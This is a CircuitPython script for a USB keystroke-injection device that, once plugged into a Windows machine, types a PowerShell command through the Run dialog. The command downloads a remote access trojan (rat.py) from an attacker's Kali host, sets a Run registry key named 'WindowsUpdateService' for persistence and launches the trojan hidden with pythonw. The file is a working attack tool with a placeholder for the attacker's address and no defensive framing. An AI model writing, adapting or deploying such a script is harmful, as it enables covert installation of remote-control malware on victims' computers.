import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

KALI_IP = "KALI_IP"   # ← CHANGE THIS
HTTP_PORT = 8080

time.sleep(1.5)

# Open Run
keyboard.press(Keycode.WINDOWS, Keycode.R)
keyboard.release_all()
time.sleep(0.8)

# Open PowerShell
layout.write("powershell")
keyboard.press(Keycode.ENTER)
keyboard.release_all()
time.sleep(2.0)

# Download + persist + execute
payload = (
    f'mkdir -Force C:\\Temp\\RAT; '
    f'cd C:\\Temp\\RAT; '
    f'Invoke-WebRequest -Uri "http://{KALI_IP}:{HTTP_PORT}/rat.py" '
    f'-OutFile rat.py -UseBasicParsing; '
    f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
    f'/v WindowsUpdateService /t REG_SZ '
    f'/d "pythonw.exe C:\\Temp\\RAT\\rat.py" /f; '
    f'pythonw.exe rat.py'
)

layout.write(payload)
keyboard.press(Keycode.ENTER)
keyboard.release_all()

time.sleep(1.0)
layout.write("exit")
keyboard.press(Keycode.ENTER)
keyboard.release_all()
